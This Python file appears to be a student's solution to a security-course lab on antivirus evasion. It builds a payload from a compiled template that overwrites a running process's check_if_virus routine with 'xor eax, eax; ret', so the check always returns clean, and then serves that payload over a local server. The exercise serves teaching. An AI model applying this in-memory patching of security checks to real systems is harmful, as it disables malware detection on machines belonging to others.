import addresses
import evasion
import struct
from infosec.core import assemble


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the check_if_virus code.

        Notes:
        1. You can assume we already compiled q2.c into q2.template.
        2. Use addresses.CHECK_IF_VIRUS_CODE (and addresses.address_to_bytes).
        3. If needed, you can use infosec.core.assemble.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q2.template'
        
        BYTE_OFFSET = 4
        adr_seq  = b'\x65\x65\x65\x65'
        pid_seq  = b'\x66\x66\x66\x66'
        data_seq = b'\x67\x67\x67\x67'
        
        with open(PATH_TO_TEMPLATE, 'rb') as template:
            code = bytearray(template.read())
       
        my_asmb = assemble.assemble_data("xor eax, eax; ret;").decode('latin1')
        pid = bytearray(struct.pack('<i', pid))
        
        for i in range(len(code) - BYTE_OFFSET):
        
            if  code[i:i+BYTE_OFFSET] == adr_seq:
                code[i:i+BYTE_OFFSET] = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_CODE)
                
            elif code[i:i+BYTE_OFFSET] == pid_seq:
                code[i:i+BYTE_OFFSET] = pid
                
            elif code[i:i+BYTE_OFFSET] == data_seq:
                code[i:i+BYTE_OFFSET] = my_asmb.encode('latin1').ljust(8,b'a')
         
        return bytes(code)
        
    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
